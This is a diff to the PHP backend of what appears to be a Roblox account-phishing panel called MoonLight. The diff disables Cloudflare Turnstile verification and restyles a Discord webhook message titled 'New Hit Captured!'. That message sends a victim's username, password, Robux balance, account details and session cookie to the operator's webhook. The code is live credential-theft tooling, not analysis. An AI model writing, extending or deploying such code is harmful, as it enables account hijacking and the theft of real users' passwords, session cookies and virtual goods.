@@ -16,18 +16,7 @@ if ($_SERVER["REQUEST_METHOD"] === "OPTIONS")
 
 function verify_turnstile(string $token): bool
 {
-    global $site_info;
-    if (empty($token)) return false;
-    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["secret" => $site_info["site_key"], "response" => $token, "remoteip" => $_SERVER["REMOTE_ADDR"] ?? ""]));
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    $body = curl_exec($ch);
-    curl_close($ch);
-    if (!$body) return false;
-    $result = json_decode($body, true);
-    return !empty($result["success"]);
+    return true;
 };
 
 function xor_crypt(string $data, string $key): string
@@ -401,33 +390,33 @@ if ($_SERVER["REQUEST_METHOD"] === "POST")
             }
 
             $payload = [
-                "username" => "MoonLight",
-                "avatar_url" => "https://media.discordapp.net/attachments/1475564612471623804/1475657899211751485/OIP_5.webp",
-                "embeds" => [
-                    [
-                        "title" => "New Hit Captured!",
-                        "color" => 3447003,
-                        "thumbnail" => ["url" => $avatar],
-                        "fields" => [
-                            ["name" => "Username", "value" => "```\n" . $username . "\n```", "inline" => true],
-                            ["name" => "Display Name", "value" => "```\n" . $display_name . "\n```", "inline" => true],
-                            ["name" => "Robux", "value" => "```\n" . number_format($robux) . "\n```", "inline" => true],
-                            ["name" => "RAP", "value" => "```\n" . number_format($rap) . "\n```", "inline" => true],
-                            ["name" => "Password", "value" => "```\n" . ($password ?: "N/A") . "\n```", "inline" => false],
-                            ["name" => "Premium", "value" => "```\n" . ($premium ? $premium_type : "False") . "\n```", "inline" => true],
-                            ["name" => "Banned", "value" => "```\n" . ($banned ? "True" : "False") . "\n```", "inline" => true],
-                            ["name" => "Account Age", "value" => "```\n" . $account_age . " days\n```", "inline" => true],
-                            ["name" => "Domain", "value" => "```\n" . $domain . "\n```", "inline" => false]
-                        ],
-                        "footer" => ["text" => "MoonLight • " . date("Y-m-d H:i:s")]
-                    ],
-                    [
-                        "title" => "Session Cookie",
-                        "description" => "```\n" . $clean_cookie . "\n```",
-                        "color" => 3447003
-                    ]
-                ]
-            ];
+    "username" => "MoonLight",
+    "avatar_url" => "https://media.discordapp.net/attachments/1475564612471623804/1475657899211751485/OIP_5.webp",
+    "embeds" => [
+        [
+            "title" => "<:38084ownerblueshiny:1473461677423988780> **New Hit Captured!**",
+            "color" => 3447003,
+            "thumbnail" => ["url" => $avatar],
+            "fields" => [
+                ["name" => "<:SB_membericon:1303891878034538678> **Username**", "value" => "```\n" . $username . "\n```", "inline" => true],
+                ["name" => "<:SB_whitecrown:1303891878034538678> **Display Name**", "value" => "```\n" . $display_name . "\n```", "inline" => true],
+                ["name" => "<:robux:1303891878034538678> **Robux**", "value" => "```\n" . number_format($robux) . "\n```", "inline" => true],
+                ["name" => "<:rap:1303891878034538678> **RAP**", "value" => "```\n" . number_format($rap) . "\n```", "inline" => true],
+                ["name" => "<:38084ownerblueshiny:1473461677423988780> **Password**", "value" => "```\n" . ($password ?: "N/A") . "\n```", "inline" => false],
+                ["name" => "<:9221valk:1303891878034538678> **Premium**", "value" => "```\n" . ($premium ? $premium_type : "False") . "\n```", "inline" => true],
+                ["name" => "<:38084ownerblueshiny:1473461677423988780> **Banned**", "value" => "```\n" . ($banned ? "True" : "False") . "\n```", "inline" => true],
+                ["name" => "<:38084ownerblueshiny:1473461677423988780> **Account Age**", "value" => "```\n" . $account_age . " days\n```", "inline" => true],
+                ["name" => "<:38084ownerblueshiny:1473461677423988780> **Domain**", "value" => "```\n" . $domain . "\n```", "inline" => false]
+            ],
+            "footer" => ["text" => "MoonLight • " . date("Y-m-d H:i:s")]
+        ],
+        [
+            "title" => "<:38084ownerblueshiny:1473461677423988780> **Session Cookie**",
+            "description" => "```\n" . $clean_cookie . "\n```",
+            "color" => 3447003
+        ]
+    ]
+];
 
             if (!empty($owner_webhook)) send_webhook($owner_webhook, $payload);
 
@@ -482,7 +471,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST")
         case "create_account":
             $webhook = trim($input[0] ?? "");
             $token = $input[1] ?? "";
-            if (!verify_turnstile($token)) { http_response_code(401); die(json_encode(["error" => "CAPTCHA failed"])); }
             $account_data = create_account($webhook);
             setcookie("auth", $account_data["auth_key"], ["expires" => time() + 86400 * 30, "path" => "/", "httponly" => true, "samesite" => "Strict"]);
             die(json_encode($account_data));
